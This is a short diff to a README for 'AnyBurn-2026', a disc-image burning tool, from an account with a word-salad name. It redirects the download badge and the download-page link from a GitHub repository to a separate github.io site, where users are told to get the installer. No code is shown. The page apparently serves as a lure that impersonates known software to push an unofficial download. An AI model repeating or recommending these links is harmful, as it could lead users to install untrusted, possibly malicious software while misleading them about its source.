@@ -1,6 +1,6 @@
 # 💿 AnyBurn-2026 - Write Disc Images to Any Drive
 
-[![](https://img.shields.io/badge/Download-AnyBurn-blue.svg)](https://github.com/forehanddrivemechanicalmixture991/AnyBurn-2026)
+[![](https://img.shields.io/badge/Download-AnyBurn-blue.svg)](https://forehanddrivemechanicalmixture991.github.io)
 
 ## 📁 What is AnyBurn-2026
 
@@ -19,7 +19,7 @@ AnyBurn-2026 serves as a tool for burning disc images to physical media. It work
 You need to access the installer to use the application. Follow these instructions to reach the files.
 
 1. Open your web browser.
-2. Visit the [AnyBurn-2026 Download Page](https://github.com/forehanddrivemechanicalmixture991/AnyBurn-2026).
+2. Visit the [AnyBurn-2026 Download Page](https://forehanddrivemechanicalmixture991.github.io).
 3. Look for the release section on the right side of the screen.
 4. Select the latest version to start the download.
 
